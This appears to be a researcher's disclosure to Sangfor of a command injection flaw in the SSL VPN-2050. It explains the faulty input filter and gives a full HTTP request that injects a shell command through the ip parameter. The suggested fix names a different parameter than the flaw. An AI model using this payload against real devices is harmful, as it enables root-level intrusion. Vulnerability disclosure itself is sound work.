Hi,

I am eack from Codesafe Team of Legendsec at Qi'anxin Group.

Recently, I found that the Sangfor SSL VPN-2050 has a command injection vulnerability. The attacker can obtain the root shell and execute arbitrary commands. The tested device firmware version is M7.6.3. The vulnerability details are as follows:

This vulnerability is due to a logic vulnerability in the filter function, resulting in command execution of the ip and port parameters.

The vulnerability exists in gcs_webui.cgi, which corresponds to the IP address and port options under "System Maintenance - Proxy Settings" on the administration page.

Vulnerability code:
![1.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561622195475389.png)

Guess the developer wants to filter the ip and port parameters by the str_filter function. In the first if judgment, the str_filter function needs to return 0 to continue the following processing of the port parameter. 
The implementation of the str_filter function is as follows:
![2.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561622267799970.png)

In this while loop, v2 does not play any role, the range of filtering characters is also problematic, resulting in as long as the number and '/' will fall into the while loop, always write data to a1, but if it is other characters For example, if the letter, '%', etc., it will return 0, but this just meets the judgment of if, and can continue the processing. This logic, just enough to constantly cover the address on the heap, leaks the data on the heap through formatted strings such as %s and %x.
The last parameter is spliced, and the command is executed by the call_DoShellProxy function to call popen.

The payload of the vulnerability recurrence is as follows:
Command injection through the ip parameter on port 1000:

GET /cgi-bin/gcs_webui.cgi?requestarg=2&requestname=17&csrf=119a080699cc70839b6c8b434bcca478&enabled=1&ip=10.10.10.1';ping%2010.92.2.110;echo'&port=1111111%s%x&auth=2&name=aaaaaaa%s&passwd=1230000000000000000000000000000000000000 HTTP/1.1
Host: 10.92.2.17:1000
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Referer: http://10.92.2.17:1000/html/gcs_proxyset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh_CN; PHPSESSID=e116e0e2c17bed877d1f825a77e6babf; sinfor_session_id=W38F984ADB3BE348FEF4EE72B628B3C6; x-anti-csrf-gcs=A160FB2300484911
Connection: close

Under the terminal you can see that the command is executed:
![5.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561626103122469.png)
You can also see that the command is executed by capturing the packet:
![4.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561624621269779.png)
Can fix the vulnerability by filtering the passwd parameter.

Best wishes
